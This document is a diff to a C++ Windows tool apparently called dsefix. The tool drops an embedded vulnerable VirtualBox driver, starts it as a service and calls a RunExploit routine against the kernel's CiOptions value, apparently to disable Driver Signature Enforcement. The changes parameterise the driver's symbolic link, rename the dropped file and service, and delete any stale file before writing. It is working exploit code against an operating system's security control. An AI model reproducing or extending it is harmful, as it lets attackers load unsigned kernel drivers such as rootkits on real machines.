@@ -153,6 +153,7 @@ public:
 		strcat(szFilePath, "\\");
 		strcat(szFilePath, szFileName);
 
+		DeleteFileA(szFilePath);
 		HANDLE hFile = CreateFileA(szFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 		if (hFile == INVALID_HANDLE_VALUE)
 			return FALSE;
@@ -168,7 +169,7 @@ public:
 		DeleteFileA(szFilePath);
 	}
 
-	HANDLE StartDriver(LPCSTR szServiceName) {
+	HANDLE StartDriver(LPCSTR szServiceName, LPCSTR szSymbolicLink) {
 		if (schSCManager == NULL)
 			return 0;
 
@@ -194,7 +195,7 @@ public:
 
 			if (ret || (err == ERROR_SERVICE_ALREADY_RUNNING)) {
 				hDevice = CreateFile(
-					"\\\\.\\VBoxDrv",
+					szSymbolicLink,
 					GENERIC_READ | GENERIC_WRITE,
 					0,
 					NULL,
@@ -399,8 +400,8 @@ int main(int argc, char *argv[]) {
 	if (CiOptionsAddress == 0)
 		return 0;
 
-	dsefix.DropFile("VBoxDrv384821.sys", ::VBoxDrv, sizeof(::VBoxDrv));
-	dsefix.StartDriver("VBoxDrv948573");
+	dsefix.DropFile("VBoxDrv_384821.sys", ::VBoxDrv, sizeof(::VBoxDrv));
+	dsefix.StartDriver("VBoxDrv_948573", ::VBoxSymLink);
 	dsefix.RunExploit(bEnable, CiOptionsAddress);
 	dsefix.StopDriver();
 	dsefix.CleanFile();
